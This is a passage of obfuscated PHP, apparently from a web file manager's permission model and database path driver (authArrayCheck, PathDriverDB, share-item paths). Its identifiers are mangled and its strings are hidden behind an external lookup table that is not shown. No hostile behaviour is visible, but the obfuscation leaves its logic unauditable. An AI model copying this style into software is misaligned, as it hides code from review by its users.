$this->authFolderOwnerGroup($òÎ¾À³[$”áÃàšŠ[505]]); } $şä¡¶ıÙ = array_unique($şä¡¶ıÙ); if (AuthModel::authCheckRoot($òÎ¾À³[$”áÃàšŠ[422]][$”áÃàšŠ[423]])) { $şä¡¶ıÙ[] = USER_ID; } $òÎ¾À³[$”áÃàšŠ[422]][$”áÃàšŠ[2063]] = Model($”áÃàšŠ[513])->userListInfo($şä¡¶ıÙ); return $òÎ¾À³; } private function authFolderOwnerGroup($×†ÛşÚƒ) { $‰™Í =& $_SERVER[Å¶¨Şêº]; $ÔÉ¨¶È = Model($‰™Í[1942])->where(array($‰™Í[1852] => $×†ÛşÚƒ))->select(); $é¥›üÙ¤ = array(); if (!$ÔÉ¨¶È) { return $é¥›üÙ¤; } foreach ($ÔÉ¨¶È as $ñ«æÉ³) { $¨Š½Í‰÷ = $this->authInfo($ñ«æÉ³); if (AuthModel::authCheckRoot($¨Š½Í‰÷[$‰™Í[422]])) { $é¥›üÙ¤[] = $ñ«æÉ³[$‰™Í[1663]]; } } return $é¥›üÙ¤; } private function authFolderOwnerUser($­Ÿ¡Â¿) { $ëóú€‹ =& $_SERVER[Å¶¨Şêº]; $¤‘“¦¬ = array(); $ÌÆøÛ°£ = !1; foreach ($­Ÿ¡Â¿ as $¬™¯ã¿) { $óÈ‹Õ±± = $this->authInfo($¬™¯ã¿); if ($¬™¯ã¿[$ëóú€‹[505]] == $ëóú€‹[209]) { $ÌÆøÛ°£ = !0; } if ($¬™¯ã¿[$ëóú€‹[420]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($óÈ‹Õ±±[$ëóú€‹[422]])) { $¤‘“¦¬[] = $¬™¯ã¿[$ëóú€‹[505]]; } } } return array($ëóú€‹[599] => $¤‘“¦¬, $ëóú€‹[2062] => $ÌÆøÛ°£); } public function authMake($“½î©Ö¼, $™å¨¾÷ò = false) { $ŒµÄ¡ë =& $_SERVER[Å¶¨Şêº]; $¨×©Ã§ú = $this->authArrayCheck($“½î©Ö¼, $™å¨¾÷ò); if ($¨×©Ã§ú[$ŒµÄ¡ë[2064]]) { $¨×©Ã§ú[$ŒµÄ¡ë[2064]] = $this->sourceAuthInfo($¨×©Ã§ú[$ŒµÄ¡ë[2064]]); } return $¨×©Ã§ú; } public function authArrayCheck($Çğ¯½², $Àöüª¬µ = false) { $ƒĞğ¨Õ =& $_SERVER[Å¶¨Şêº]; if (!$Çğ¯½²) { return array($ƒĞğ¨Õ[423] => 0, $ƒĞğ¨Õ[476] => !1); } $Àöüª¬µ = $Àöüª¬µ ? $Àöüª¬µ : USER_ID; $ë˜’æšœ = 0; $ÉÂû…¥Ò = 0; $Ö˜È‹¡ø = 0; $³“Ûı±ñ = 0; $Çùû”Ø = 0; $ò…‹«Ù = 0; $…ÕµÄ†¬ = 1000; $ŒÒƒ•˜’ = 0; $ÓÈàÊ­ª = 0; $á¯¹Ğ»ñ = 0; $¼ãíµÕ­ = 0; $™ÚºîÛ = array($ƒĞğ¨Õ[411] => 0); foreach ($Çğ¯½² as $™ÚºîÛ) { $²éÈ×Âş = $this->authInfo($™ÚºîÛ); if (!$²éÈ×Âş) { continue; } $«Õ”¨ç = $™ÚºîÛ[$ƒĞğ¨Õ[505]]; $éõµœÚ = intval($²éÈ×Âş[$ƒĞğ¨Õ[422]]); if ($™ÚºîÛ[$ƒĞğ¨Õ[420]] == SourceModel::TYPE_USER && $«Õ”¨ç == $Àöüª¬µ) { $ë˜’æšœ = !0; $Ö˜È‹¡ø = $²éÈ×Âş; $ÉÂû…¥Ò = $éõµœÚ; } else { if ($™ÚºîÛ[$ƒĞğ¨Õ[420]] == SourceModel::TYPE_GROUP && $this->groupContainUser($«Õ”¨ç, $Àöüª¬µ)) { $³“Ûı±ñ = !0; $ØÖêö†ö = $this->groupStepToUserGroup($«Õ”¨ç, $Àöüª¬µ); if ($ØÖêö†ö < $…ÕµÄ†¬) { $…ÕµÄ†¬ = $ØÖêö†ö; $Çùû”Ø = $éõµœÚ; $ò…‹«Ù = $²éÈ×Âş; $ŒÒƒ•˜’ = $«Õ”¨ç; } if ($ØÖêö†ö == $…ÕµÄ†¬ && $éõµœÚ >= $Çùû”Ø) { $Çùû”Ø = $éõµœÚ; $ò…‹«Ù = $²éÈ×Âş; $ŒÒƒ•˜’ = $«Õ”¨ç; } } else { if ($«Õ”¨ç == $ƒĞğ¨Õ[209]) { $ÓÈàÊ­ª = !0; $¼ãíµÕ­ = $²éÈ×Âş; $á¯¹Ğ»ñ = $éõµœÚ; } } } } if ($ë˜’æšœ) { $î¶ø½ñŒ = $ÉÂû…¥Ò; $²éÈ×Âş = $Ö˜È‹¡ø; $ĞøÇÃ² = LNG($ƒĞğ¨Õ[2065]); } else { if ($³“Ûı±ñ) { $î¶ø½ñŒ = $Çùû”Ø; $²éÈ×Âş = $ò…‹«Ù; $÷™ìÎÇ‚ = Model($ƒĞğ¨Õ[521])->getInfo($ŒÒƒ•˜’); $ĞøÇÃ² = $ƒĞğ¨Õ[173] . $÷™ìÎÇ‚[$ƒĞğ¨Õ[525]] . $ƒĞğ¨Õ[2066] . LNG($ƒĞğ¨Õ[2067]); } else { if ($ÓÈàÊ­ª) { $î¶ø½ñŒ = $á¯¹Ğ»ñ; $²éÈ×Âş = $¼ãíµÕ­; $ĞøÇÃ² = LNG($ƒĞğ¨Õ[2038]); } else { $î¶ø½ñŒ = 0; $²éÈ×Âş = !1; $ĞøÇÃ² = $ƒĞğ¨Õ[12]; } } } $“³‰ËÂ = array($ƒĞğ¨Õ[2057] => intval($î¶ø½ñŒ), $ƒĞğ¨Õ[2041] => $²éÈ×Âş, $ƒĞğ¨Õ[2058] => $ĞøÇÃ², $ƒĞğ¨Õ[2050] => $™ÚºîÛ[$ƒĞğ¨Õ[411]]); return $“³‰ËÂ; } private function groupContainUser($‚™ªğåà, $û°òˆÙ¡ = false) { return in_array($‚™ªğåà, $this->userGroupParents($û°òˆÙ¡)); } private function groupStepToUserGroup($ÒˆƒÌ¨Ñ, $·†¶÷‰ = false) { $‹áéßµÛ =& $_SERVER[Å¶¨Şêº]; $ï¨š­Á› = $this->userGroupList($·†¶÷‰); $ƒÅÆ‰Íà = 1000; $¶Áíğé = $GLOBALS[$‹áéßµÛ[6]][$‹áéßµÛ[100]][$‹áéßµÛ[1955]] == 1; $ú˜ëêèø = $¶Áíğé ? 3 : 2; foreach ($ï¨š­Á› as $¸µİÉÕ•) { if ($¸µİÉÕ•[$‹áéßµÛ[1852]] == $ÒˆƒÌ¨Ñ) { return 0; } $˜ÁˆÂêá = explode($‹áéßµÛ[60], trim($¸µİÉÕ•[$‹áéßµÛ[520]], $‹áéßµÛ[60])); if ($˜ÁˆÂêá[0] == $‹áéßµÛ[209] && count($˜ÁˆÂêá) > $ú˜ëêèø) { $œÜ´˜¢ = array_reverse(array_slice($˜ÁˆÂêá, $ú˜ëêèø)); $’º¸Ñ²¨ = array_search($ÒˆƒÌ¨Ñ, $œÜ´˜¢); if ($’º¸Ñ²¨ !== !1 && $’º¸Ñ²¨ + 1 <= $ƒÅÆ‰Íà) { $ƒÅÆ‰Íà = $’º¸Ñ²¨ + 1; } } } return $ƒÅÆ‰Íà; } private function userGroupList($ì¾º„› = false) { $èô­İå =& $_SERVER[Å¶¨Şêº]; static $¦Å’Â´¬ = array(); if (isset($¦Å’Â´¬[$ì¾º„›])) { return $¦Å’Â´¬[$ì¾º„›]; } $Ú¶¿ôÕ = Model($èô­İå[534])->getInfo($ì¾º„›); $¦Å’Â´¬[$ì¾º„›] = array_to_keyvalue($Ú¶¿ôÕ[$èô­İå[2039]], $èô­İå[1852]); return $¦Å’Â´¬[$ì¾º„›]; } public function userGroupParents($‹ıÓÄÆ) { $îãôñ– =& $_SERVER[Å¶¨Şêº]; static $­º­ôŠ = array(); $‹ıÓÄÆ = $‹ıÓÄÆ ? $‹ıÓÄÆ : USER_ID; if (isset($­º­ôŠ[$‹ıÓÄÆ])) { return $­º­ôŠ[$‹ıÓÄÆ]; } $ËÊçğà = $this->userGroupList($‹ıÓÄÆ); $ÔÆ©¼ƒ© = array(); $¦Û¾©‰ = $GLOBALS[$îãôñ–[6]][$îãôñ–[100]][$îãôñ–[1955]] == 1; $¡œ¥¦»„ = $¦Û¾©‰ ? 3 : 2; foreach ($ËÊçğà as $¦åŸ™¢î) { $ü…‰¡ñØ = array($¦åŸ™¢î[$îãôñ–[1852]]); $µ„ä©óØ = explode($îãôñ–[60], trim($¦åŸ™¢î[$îãôñ–[520]], $îãôñ–[60])); if ($µ„ä©óØ[0] == $îãôñ–[209] && count($µ„ä©óØ) > $¡œ¥¦»„) { $ãÆö²ßí = array_slice($µ„ä©óØ, $¡œ¥¦»„); $ü…‰¡ñØ = array_merge($ü…‰¡ñØ, array_reverse($ãÆö²ßí)); } $ÔÆ©¼ƒ© = array_merge($ÔÆ©¼ƒ©, $ü…‰¡ñØ); } $­º­ôŠ[$‹ıÓÄÆ] = array_unique($ÔÆ©¼ƒ©); return $­º­ôŠ[$‹ıÓÄÆ]; } public function authTargetInfoMake($‚Ìß‡²) { $ª·“ùø =& $_SERVER[Å¶¨Şêº]; $†á´ã³Š = array(); $ıÏ›ìœæ = array(); foreach ($‚Ìß‡² as $ÊíÎ‚Ó) { if ($ÊíÎ‚Ó[$ª·“ùø[420]] == SourceModel::TYPE_USER) { $†á´ã³Š[] = intval($ÊíÎ‚Ó[$ª·“ùø[505]]); } else { if ($ÊíÎ‚Ó[$ª·“ùø[420]] == SourceModel::TYPE_GROUP) { $ıÏ›ìœæ[] = intval($ÊíÎ‚Ó[$ª·“ùø[505]]); } } } if ($†á´ã³Š) { $†á´ã³Š = Model($ª·“ùø[513])->userListInfo($†á´ã³Š); } if ($ıÏ›ìœæ) { $ãÑÔ­ÀÊ = array($ª·“ùø[1940] => array($ª·“ùø[427], $ıÏ›ìœæ)); $ıÏ›ìœæ = Model($ª·“ùø[521])->field($ª·“ùø[2068])->where($ãÑÔ­ÀÊ)->select(); $ıÏ›ìœæ = array_to_keyvalue($ıÏ›ìœæ, $ª·“ùø[1852]); } return array($ª·“ùø[2069] => $†á´ã³Š, $ª·“ùø[2070] => $ıÏ›ìœæ); } public function authInfo($á¢œ‡©Ø) { $¼ºæ©û =& $_SERVER[Å¶¨Şêº]; if ($á¢œ‡©Ø[$¼ºæ©û[1956]]) { $É²Ó‚Í = Model($¼ºæ©û[507])->listData($á¢œ‡©Ø[$¼ºæ©û[1956]]); if (!$É²Ó‚Í) { return !1; $ÃÉ¥¤›ø = Model($¼ºæ©û[507])->listData(); $éŒß™‚Â = array_filter_by_field($ÃÉ¥¤›ø, $¼ºæ©û[422], $¼ºæ©û[209]); return $éŒß™‚Â; } $øé‘ä¯â = array_field_key($É²Ó‚Í, array($¼ºæ©û[408], $¼ºæ©û[42], $¼ºæ©û[422], $¼ºæ©û[1875], $¼ºæ©û[1876])); $øé‘ä¯â[$¼ºæ©û[2071]] = $á¢œ‡©Ø; return $øé‘ä¯â; } else { return array($¼ºæ©û[428] => 0, $¼ºæ©û[1858] => $á¢œ‡©Ø[$¼ºæ©û[2016]], $¼ºæ©û[429] => $¼ºæ©û[12], $¼ºæ©û[1875] => $¼ºæ©û[2072]); } } } goto e‹’‘š©Ğ; a—ÑùëÓ£: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($˜¨ºó™) { $this->pathParse = $˜¨ºó™; $this->model = Model($_SERVER[Å¶¨Şêº][1337]); } public function getPath($âÓÅãò) { return trim($âÓÅãò, $_SERVER[Å¶¨Şêº][8]); } public function pathFather($ş½ı±—Ï) { $¿¬ÀåÙ = $this->parse($ş½ı±—Ï); $¿¬ÀåÙ = $this->infoSimple($ş½ı±—Ï); return $¿¬ÀåÙ ? $¿¬ÀåÙ[$_SERVER[Å¶¨Şêº][441]] : !1; } public function pathThis($çÕ²Ë®) { $‡¯Á¢§ = $this->infoSimple($çÕ²Ë®); return $‡¯Á¢§ ? $‡¯Á¢§[$_SERVER[Å¶¨Şêº][42]] : !1; } public function getPathOuter($¶à˜±½) { if (!$¶à˜±½) { return $¶à˜±½; } $ØıñÙÖ¾ = $this->parse($¶à˜±½); return KodIO::make($ØıñÙÖ¾[$_SERVER[Å¶¨Şêº][408]]); } public function copyFolderFromIO($á‹ç‚å, $ğØØƒ—×, $â¼Ó¿§ú, $…—ß½É¶, $…Åè†È) { $şèñÃ³ = $this->model->copyFolderFromIO($á‹ç‚å, $ğØØƒ—×, $â¼Ó¿§ú, $…—ß½É¶, $…Åè†È); return KodIO::make($şèñÃ³); } public function isParentOf($«©ü¯¹‹, $ˆÊ³Ùù) { return $this->model->isParentOf($«©ü¯¹‹, $ˆÊ³Ùù); } public function mkfile($£³Ç÷ï½, $¨‹ÏÕ²« = '', $¹äéÌÜÑ = REPEAT_RENAME) { $¿áü—€† =& $_SERVER[Å¶¨Şêº]; $·šúÏ•é = $this->parse($£³Ç÷ï½); $£³Ç÷ï½ = $·šúÏ•é[$¿áü—€†[408]]; for ($ÁÓÃüï = 0; $ÁÓÃüï < count($·šúÏ•é[$¿áü—€†[1338]]); $ÁÓÃüï++) { $³şßı‡ï = $·šúÏ•é[$¿áü—€†[1338]][$ÁÓÃüï]; if ($ÁÓÃüï == count($·šúÏ•é[$¿áü—€†[1338]]) - 1) { $£³Ç÷ï½ = $this->model->mkfile($£³Ç÷ï½, $³şßı‡ï, $¨‹ÏÕ²«, $¹äéÌÜÑ); break; } $£³Ç÷ï½ = $this->model->mkdir($£³Ç÷ï½, $³şßı‡ï, REPEAT_SKIP); } return $this->getPathOuter($£³Ç÷ï½); } public function mkdir($˜ö«İê, $²ß—’ú€ = REPEAT_SKIP) { $æÈë¼Ò =& $_SERVER[Å¶¨Şêº]; $“ÑÌú‘Ã = $this->parse($˜ö«İê); $˜ö«İê = $“ÑÌú‘Ã[$æÈë¼Ò[408]]; for ($ìÛ‰˜ãğ = 0; $ìÛ‰˜ãğ < count($“ÑÌú‘Ã[$æÈë¼Ò[1338]]); $ìÛ‰˜ãğ++) { $¦±ÉäÙÏ = $“ÑÌú‘Ã[$æÈë¼Ò[1338]][$ìÛ‰˜ãğ]; $˜ö«İê = $this->model->mkdir($˜ö«İê, $¦±ÉäÙÏ, $²ß—’ú€); } return $this->getPathOuter($˜ö«İê); } public function copyFile($æšÄå á, $µÒè¼Ø–, $ûÙ €ìÀ = REPEAT_REPLACE) { $‹ÃçÔÂõ =& $_SERVER[Å¶¨Şêº]; $„ŒÔöß¢ = $this->parse($µÒè¼Ø–); $Õ¤šºàì = $this->model->copy($æšÄå á, $„ŒÔöß¢[$‹ÃçÔÂõ[408]], $ûÙ €ìÀ, $„ŒÔöß¢[$‹ÃçÔÂõ[95]]); return $Õ¤šºàì ? $this->getPathOuter($Õ¤šºàì) : !1; } public function moveFile($´ÊØëŸ, $î Ã–Í°, $å´Å•ú = REPEAT_REPLACE) { $§‚·ÄÇâ =& $_SERVER[Å¶¨Şêº]; $ÎŸ¯õÁÃ = $this->parse($î Ã–Í°); $½‹ß­³ˆ = $this->model->move($´ÊØëŸ, $ÎŸ¯õÁÃ[$§‚·ÄÇâ[408]], $å´Å•ú, $ÎŸ¯õÁÃ[$§‚·ÄÇâ[95]]); return $½‹ß­³ˆ ? $this->getPathOuter($½‹ß­³ˆ) : !1; } public function copy($½‹ã‡ÉÂ, $Øä¤ùìö, $¼åšèÚ¢ = REPEAT_REPLACE, $—¹›¸Õ› = false) { $³±î Òî = $this->parse($Øä¤ùìö); $á¤ÒÖ¤ = $this->model->copy($½‹ã‡ÉÂ, $³±î Òî[$_SERVER[Å¶¨Şêº][408]], $¼åšèÚ¢, $—¹›¸Õ›); return $á¤ÒÖ¤ ? $this->getPathOuter($á¤ÒÖ¤) : !1; } public function moveSameAllow() { } public function move($ä§´€®§, $ª¡Èªğ©, $ŠŒœë… = REPEAT_REPLACE, $—áè‘Ì = false) { $¥Ù­ÖÁ = $this->parse($ª¡Èªğ©); $“íøÇ = $this->model->move($ä§´€®§, $¥Ù­ÖÁ[$_SERVER[Å¶¨Şêº][408]], $ŠŒœë…, $—áè‘Ì); return $“íøÇ ? $this->getPathOuter($“íøÇ) : !1; } public function remove($½øú­‹¦, $„Ì°·‘È = true) { return $this->model->remove($½øú­‹¦, $„Ì°·‘È); } public function rename($ï¶öóŒ, $ƒ×€ë¸î) { $Û«ÊÂšš = $this->model->rename($ï¶öóŒ, $ƒ×€ë¸î); return $Û«ÊÂšš ? $this->getPathOuter($ï¶öóŒ) : $Û«ÊÂšš; } public function size($¶ç¹•×) { $ÕğúÃã = $this->infoSimple($¶ç¹•×); return $ÕğúÃã ? $ÕğúÃã[$_SERVER[Å¶¨Şêº][87]] : 0; } public function infoSimple($Ôêµ‡ìÃ) { return $this->model->sourceInfo($Ôêµ‡ìÃ); } public function info($â—·Şæ) { return $this->infoParse($â—·Şæ); } public function infoAuth($áŸøÏş›) { return $this->infoParse($áŸøÏş›, !1, !0); } public function infoWithChildren($é‰±­Å) { return $this->infoParse($é‰±­Å, !0); } protected function infoParse($ì˜Öµ˜ğ, $îŸ°çúù = false, $±×ú—õƒ = false) { if (!$îŸ°çúù) { return $this->model->pathInfo($ì˜Öµ˜ğ, $±×ú—õƒ); } return $this->model->pathInfoMore($ì˜Öµ˜ğ); } public function infoFull($—ş¢µŸã) { $¤ì”ù =& $_SERVER[Å¶¨Şêº]; $¸ûÓÜ¬ = explode($¤ì”ù[8], $—ş¢µŸã); $ÀÌáç´Ó = implode($¤ì”ù[8], array_splice($¸ûÓÜ¬, 1)); return $this->model->pathInfoByPath($¸ûÓÜ¬[0], $ÀÌáç´Ó); } public function hashSimple($Ôğ’õÚ©) { $ËŞ€º®³ =& $_SERVER[Å¶¨Şêº]; $‹¾ĞÔ˜÷ = $this->infoWithChildren($Ôğ’õÚ©); return $‹¾ĞÔ˜÷[$ËŞ€º®³[181]][$ËŞ€º®³[188]]; } public function hashMd5($±«í ğ¦) { $ğ‘­ç =& $_SERVER[Å¶¨Şêº]; $“ ö¿Éù = $this->infoWithChildren($±«í ğ¦); return $“ ö¿Éù[$ğ‘­ç[181]][$ğ‘­ç[187]]; } public function exist($Ï¾½Ÿ›Ù) { $Úû´àœ‘ =& $_SERVER[Å¶¨Şêº]; $§éÉ‰ = $this->parse($Ï¾½Ÿ›Ù); if (!$§éÉ‰[$Úû´àœ‘[95]]) { return $this->isFile($Ï¾½Ÿ›Ù) || $this->isFolder($Ï¾½Ÿ›Ù); } $¶¼©££ğ = array($Úû´àœ‘[410] => $§éÉ‰[$Úû´àœ‘[408]], $Úû´àœ‘[42] => $§éÉ‰[$Úû´àœ‘[95]]); $ôü§çÑı = $this->model->where($¶¼©££ğ)->find(); return $ôü§çÑı ? !0 : !1; } public function isFile($ã«òíã¿) { $Ì•íãµ” =& $_SERVER[Å¶¨Şêº]; $…„¯¶° = $this->infoSimple($ã«òíã¿); return $…„¯¶° && $…„¯¶°[$Ì•íãµ”[419]] == $Ì•íãµ”[99] ? !1 : !0; } public function isFolder($äå¥´í) { $§Óå²«ğ =& $_SERVER[Å¶¨Şêº]; $áÁØÛ¼í = $this->infoSimple($äå¥´í); return $áÁØÛ¼í && $áÁØÛ¼í[$§Óå²«ğ[419]] == $§Óå²«ğ[99] ? !0 : !1; } public function listPath($¬²‚‹ù, $øÄ½Â¹¸ = false) { $° ÉêÄ =& $_SERVER[Å¶¨Şêº]; if ($¬²‚‹ù == $° ÉêÄ[12]) { return !1; } $ñ•ûÈ€é = array($° ÉêÄ[410] => $¬²‚‹ù); if ($øÄ½Â¹¸) { return $this->model->listSource($ñ•ûÈ€é, -1); } return $this->model->listSource($ñ•ûÈ€é); } public function has($ĞÇ›˜¯, $öˆèãìÊ = false, $…Ó”¸ = null) { $ÃïğàÉ§ =& $_SERVER[Å¶¨Şêº]; $åÄš…Û = $this->infoWithChildren($ĞÇ›˜¯); if ($öˆèãìÊ) { return array($ÃïğàÉ§[219] => $åÄš…Û[$ÃïğàÉ§[219]], $ÃïğàÉ§[218] => $åÄš…Û[$ÃïğàÉ§[218]]); } return $…Ó”¸ ? $åÄš…Û[$ÃïğàÉ§[219]] : $åÄš…Û[$ÃïğàÉ§[218]]; } public function listAll($‚ÒÆí) { $Ù˜©ÜØ± = IO::info($this->pathParse[$_SERVER[Å¶¨Şêº][95]]); if (!$Ù˜©ÜØ±) { return array(); } return $this->model->listAll($‚ÒÆí); } public function getContent($òÍùŠØŸ) { return $this->model->getContent($òÍùŠØŸ); } public function setContent($Ïî²§ı¼, $ÚÉŒ±É = '') { return $this->model->setContent($Ïî²§ı¼, $ÚÉŒ±É); } public function fileSubstr($ËÃîæ©, $Şß•¾¬‹, $Éí³ñÙ) { return $this->model->fileSubstr($ËÃîæ©, $Şß•¾¬‹, $Éí³ñÙ); } public function download($…×”ëŸô, $ÕÒÔê©ù = '') { $õèà›ß = get_path_father($ÕÒÔê©ù); $‡ç¶ä— = get_path_this($ÕÒÔê©ù); $Ç¤¯§è÷ = $this->model->fileInfoGet($…×”ëŸô); $åôóğÂ¾ = IO::copy($Ç¤¯§è÷[$_SERVER[Å¶¨Şêº][95]], $õèà›ß, !1, $‡ç¶ä—); return $åôóğÂ¾; } public function setModifyTime($áœÜˆÌñ, $òóÙÑæº = '') { $ˆ…« Í =& $_SERVER[Å¶¨Şêº]; if (!$áœÜˆÌñ) { return; } $this->model->where(array($ˆ…« Í[426] => $áœÜˆÌñ))->save(array($ˆ…« Í[96] => $òóÙÑæº)); } public function upload($êãõ‡É™, $Ù¯ÀºÂÂ, $ì­–Íş¨ = false, $û´Üœûß = REPEAT_REPLACE) { $á¡ÑÀİ“ =& $_SERVER[Å¶¨Şêº]; $ˆéŠñĞï = $this->parse($êãõ‡É™); $…×óÛø¾ = $this->model->addFile($ˆéŠñĞï[$á¡ÑÀİ“[408]], $Ù¯ÀºÂÂ, $ˆéŠñĞï[$á¡ÑÀİ“[95]], $ì­–Íş¨, $û´Üœûß); return $this->getPathOuter($…×óÛø¾); } public function uploadFileByID($ñÖóêª°, $Ã¾ø”´, $ÑÏÇÒ¹É) { $¯…ŒÅŒé =& $_SERVER[Å¶¨Şêº]; $›£ï“Œ = $this->parse($ñÖóêª°); $ÉèøŸÊÇ = $this->model->addFileByFileID($›£ï“Œ[$¯…ŒÅŒé[408]], $Ã¾ø”´, $›£ï“Œ[$¯…ŒÅŒé[95]], $ÑÏÇÒ¹É); return $this->getPathOuter($ÉèøŸÊÇ); } public function addFileByRemote($ş“³ÑÌ, $õ›Øå‡Ò, $°àÇ¡… = array(), $Íøì©ÍÃ = '', $ĞØ…Â¢Œ) { $²´óÌŞ =& $_SERVER[Å¶¨Şêº]; $³úÒşª£ = $this->parse($ş“³ÑÌ); $Íøì©ÍÃ = empty($Íøì©ÍÃ) ? $³úÒşª£[$²´óÌŞ[95]] : $Íøì©ÍÃ; $¡ı•Æı” = $this->model->addFileByRemote($³úÒşª£[$²´óÌŞ[408]], $õ›Øå‡Ò, $Íøì©ÍÃ, $°àÇ¡…, $ĞØ…Â¢Œ); return $this->getPathOuter($¡ı•Æı”); } public function uploadLink($ÒçÎ’‚Ò, $ö•ÂÔµ = 0) { $éïÆ½Ú£ =& $_SERVER[Å¶¨Şêº]; $ù££åèì = $this->parse($ÒçÎ’‚Ò); $Û…ò—æ’ = _get($GLOBALS[$éïÆ½Ú£[7]], $éïÆ½Ú£[1339]); $Ã—¥üô = _get($GLOBALS[$éïÆ½Ú£[7]], $éïÆ½Ú£[1340]); $ÒçÎ’‚Ò = Model($éïÆ½Ú£[610])->createFileName($ù££åèì[$éïÆ½Ú£[95]], $Û…ò—æ’, $Ã—¥üô); return IO::uploadLink($ÒçÎ’‚Ò, $ö•ÂÔµ); } public function fileNameAuto($Úûî…¹‹, $À®Â™Ø, $¶¾äİ–Ü = REPEAT_REPLACE, $ÓşĞŞŠ¹ = false) { return $this->model->fileNameAuto($Úûî…¹‹, $À®Â™Ø, $¶¾äİ–Ü, $ÓşĞŞŠ¹); } public function fileNameExist($ï“Œæ®Â, $„”‡ê) { return $this->model->fileNameExist($ï“Œæ®Â, $„”‡ê); } protected function _fileOut($‡áÔ¾Åõ, $Ï»ÉÑùî = false, $ıö’¤¬— = false, $­¬±´µ = '', $Ó…€‰—Ğ = false) { $µíÂéıÃ =& $_SERVER[Å¶¨Şêº]; $ÚıÄöÔ÷ = $this->model->sourceInfo($‡áÔ¾Åõ); if ($ÚıÄöÔ÷[$µíÂéıÃ[419]] == $µíÂéıÃ[99]) { header($µíÂéıÃ[1341]); die; } $÷Å½·¦Ò = $this->model->fileInfoGet($‡áÔ¾Åõ); $­¬±´µ = $÷Å½·¦Ò[$µíÂéıÃ[187]] ? $÷Å½·¦Ò[$µíÂéıÃ[187]] : $­¬±´µ; $ıÆç‡£± = isset($GLOBALS[$µíÂéıÃ[1342]]) ? $GLOBALS[$µíÂéıÃ[1342]] : $ÚıÄöÔ÷[$µíÂéıÃ[42]]; if ($Ó…€‰—Ğ) { return IO::fileOutServer($÷Å½·¦Ò[$µíÂéıÃ[95]], $Ï»ÉÑùî, $ıÆç‡£±, $­¬±´µ); } IO::fileOut($÷Å½·¦Ò[$µíÂéıÃ[95]], $Ï»ÉÑùî, $ıÆç‡£±, $­¬±´µ); } public function fileOut($ÑëÓŞ™, $ö¯ºû€¡ = false, $Ó¥ë¼« = false, $Äóâîƒ© = '') { $this->_fileOut($ÑëÓŞ™, $ö¯ºû€¡, $Ó¥ë¼«, $Äóâîƒ©); } public function fileOutServer($”ÉÛ©ø, $ßõ€”šÁ = false, $çâé×˜Ä = false, $÷ıØÁ® = '') { $this->_fileOut($”ÉÛ©ø, $ßõ€”šÁ, $çâé×˜Ä, $÷ıØÁ®, !0); } protected function _fileOutImage($»ËÔÚå‡, $ªİçÏß  = 250) { $™‡¿î«š =& $_SERVER[Å¶¨Şêº]; $ºß¥É°Ó = $this->model->pathInfo($»ËÔÚå‡); if ($ºß¥É°Ó[$™‡¿î«š[419]] == $™‡¿î«š[99]) { show_json($™‡¿î«š[1343] . $»ËÔÚå‡, !1); } $ç„ûÙ Ş = $this->model->fileInfoGet($»ËÔÚå‡); $ç„ûÙ Ş[$™‡¿î«š[42]] = $ºß¥É°Ó[$™‡¿î«š[42]]; $ç„ûÙ Ş[$™‡¿î«š[180]] = $ºß¥É°Ó[$™‡¿î«š[180]]; $GLOBALS[$™‡¿î«š[1342]] = $ç„ûÙ Ş[$™‡¿î«š[42]]; $GLOBALS[$™‡¿î«š[179]] = $ç„ûÙ Ş; IO::fileOutImage($ç„ûÙ Ş[$™‡¿î«š[95]], $ªİçÏß ); } public function fileOutImage($Æıìıã, $ØĞÎí¥İ = 250) { $this->_fileOutImage($Æıìıã, $ØĞÎí¥İ); } public function fileOutImageServer($çºü¦è©, $î©ÇŒÒ = 250) { $this->_fileOutImage($çºü¦è©, $î©ÇŒÒ); } public function link($öó¸ûâĞ, $äˆª“À = '') { $ªöŞşÙı = $this->model->fileInfoGet($öó¸ûâĞ); return IO::link($ªöŞşÙı[$_SERVER[Å¶¨Şêº][95]], $äˆª“À); } protected function parse($¡øÚî¤Ä) { $¸çôéÀë =& $_SERVER[Å¶¨Şêº]; if (strstr($¡øÚî¤Ä, $¸çôéÀë[8]) === !1) { return array($¸çôéÀë[428] => intval($¡øÚî¤Ä), $¸çôéÀë[95] => $¸çôéÀë[12], $¸çôéÀë[1338] => array()); } $«³™†§ = explode($¸çôéÀë[8], trim($¡øÚî¤Ä, $¸çôéÀë[8])); if (count($«³™†§) < 2) { show_tips(clear_html($¡øÚî¤Ä) . $¸çôéÀë[1344]); } return array($¸çôéÀë[428] => intval($«³™†§[0]), $¸çôéÀë[95] => $«³™†§[1], $¸çôéÀë[1338] => array_slice($«³™†§, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ßãÖÉ¡Â) { $this->pathParse = $ßãÖÉ¡Â; $this->model = Model($_SERVER[Å¶¨Şêº][1337]); } public function getPathOuter($™½µúù²) { $ÒŸãº =& $_SERVER[Å¶¨Şêº]; if (!$™½µúù²) { return $™½µúù²; } $ÒÌÛêÙ¬ = $this->parse($™½µúù²); return trim(KodIO::makeShare($this->pathParse[$ÒŸãº[408]], $ÒÌÛêÙ¬[$ÒŸãº[408]]), $ÒŸãº[8]); } protected function infoParse($©¼”íÓè, $ç–›ø”¢ = false, $’Õ™ÌŸë = false) { $Ê½—É½û =& $_SERVER[Å¶¨Şêº]; $§ÑÚ¯ƒ = $this->pathParse[$Ê½—É½û[408]]; $Ùû‡öƒ» = trim($this->pathParse[$Ê½—É½û[1165]], $Ê½—É½û[8]); return Action($Ê½—É½û[1345])->sharePathInfo($§ÑÚ¯ƒ, $Ùû‡öƒ», $ç–›ø”¢); } public function infoFull($ôÑï¿’½) { $­ûô¨ïÑ =& $_SERVER[Å¶¨Şêº]; $”ç¨ôÕ¡ = explode($­ûô¨ïÑ[8], trim($ôÑï¿’½, $­ûô¨ïÑ[8])); if (count($”ç¨ôÕ¡) > 1) { $¬¯¢øÌ = implode($­ûô¨ïÑ[8], array_splice($”ç¨ôÕ¡, 1)); $ØÕ·³ƒö = $this->model->pathInfoByPath($”ç¨ôÕ¡[0], $¬¯¢øÌ); if (!$ØÕ·³ƒö) { return !1; } $this->pathParse[$­ûô¨ïÑ[1165]] = $ØÕ·³ƒö[$­ûô¨ïÑ[411]]; } return $this->infoParse($ôÑï¿’½); } public function listAll($ç¹€çñ†) { $ı£•ûåß =& $_SERVER[Å¶¨Şêº]; $Î¸×£ºä = IO::info($this->pathParse[$ı£•ûåß[95]]); if (!$Î¸×£ºä) { return array(); } $‚Ò×ò–• = $this->model->listAll($ç¹€çñ†); 